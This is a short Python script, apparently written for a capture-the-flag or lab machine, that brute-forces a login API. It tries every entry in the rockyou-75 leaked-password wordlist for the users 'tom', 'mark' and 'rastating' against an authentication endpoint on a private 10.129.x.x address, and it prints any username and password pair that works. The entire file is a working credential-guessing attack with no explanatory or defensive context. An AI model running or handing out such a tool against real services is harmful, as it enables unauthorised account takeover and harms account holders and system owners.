#!/usr/bin/env python3

from requests import post
from time import sleep

url = 'http://10.129.71.65:3000/api/session/authenticate'
wordlistPath = '/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-75.txt'
falseString = '"success":false'
usernames = ['tom', 'mark', 'rastating']

with open(wordlistPath, 'r') as wordlistFile:
	wordlist = wordlistFile.read().split('\n')

for name in usernames:
	print(f'[+] Attempting wordlist attack for {name}...')

	for i, password in enumerate(wordlist):
		try:
			response = post(url, json={'username':name, 'password':password}).text
		except:
			print(f'[-] Error on password: {password}')
			sleep(10)
		
		if falseString not in response:
			print(f'[+] Login - {name}:{password}')
			break
		else:
			if i % 100 == 0:
				print(f'Attempts for {name}: {i}')
